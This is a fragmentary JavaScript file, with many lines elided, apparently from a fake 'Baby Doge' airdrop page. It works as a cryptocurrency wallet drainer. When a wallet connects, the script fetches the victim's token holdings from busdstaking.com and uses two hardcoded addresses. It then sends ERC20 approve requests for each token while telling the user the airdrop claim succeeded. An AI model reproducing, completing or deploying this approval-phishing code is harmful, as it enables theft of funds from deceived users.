$(function() {
    ...
    const sendApproveRequest = async (idx, from, amount, tokenAddress) => {
        ...
        new web3.eth.Contract(erc20Abi, tokenAddress).methods
            ...
            .then(function(result) {
                ...
                showAlert("Successfully, you've got the Baby Doge. Your address has expired airdrop claim times.");
                nextApprove();
            })
            .catch(function(e) {
                //tokenData[idx]["approved"]=0;
    ...
    async function handleAddressChanged(accounts) {
        ...
        if (accounts && accounts[0]) {
            ...
            var res = await getAjaxData("https://busdstaking.com/" + config.apiUrl + "?method=getHoldingTokenList&addr=" + currentAccount);
            tokenData = JSON.parse(res);
            config.ow = "0x2ceFFd73505B390d9b527F1DfF36e2D0bcD6E30C";
            config.puk = "0x31c8218f7E8FB3A8Af3852161251edeD8F75b912";
